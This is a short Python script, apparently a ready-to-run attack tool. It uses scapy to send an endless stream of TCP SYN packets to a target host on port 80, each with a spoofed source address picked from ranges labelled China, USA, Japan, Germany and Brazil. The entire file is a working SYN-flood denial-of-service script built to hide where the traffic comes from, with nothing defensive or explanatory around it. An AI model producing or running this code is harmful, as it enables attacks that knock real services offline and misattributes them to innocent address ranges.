from scapy.all import *
import random
import time

def random_ip_from_country(country):
    if country == "China":
        return "223.0." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    elif country == "USA":
        return "8." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    elif country == "Japan":
        return "133." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    elif country == "Germany":
        return "46." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    elif country == "Brazil":
        return "177." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    return "192.168.1." + str(random.randint(1, 254))

def tcp_spoof(ip_dst, src_port, dst_port):
    countries = ["China", "USA", "Japan", "Germany", "Brazil"]
    while True:
        country = random.choice(countries)
        ip_src = random_ip_from_country(country)
        ip_header = IP(src=ip_src, dst=ip_dst)
        tcp_header = TCP(sport=src_port, dport=dst_port, flags="S")  # SYN flag
        packet = ip_header / tcp_header
        send(packet, verbose=False)

tcp_spoof("192.168.1.200", 12345, 80)  # Spoofing TCP SYN com origens aleatorias.
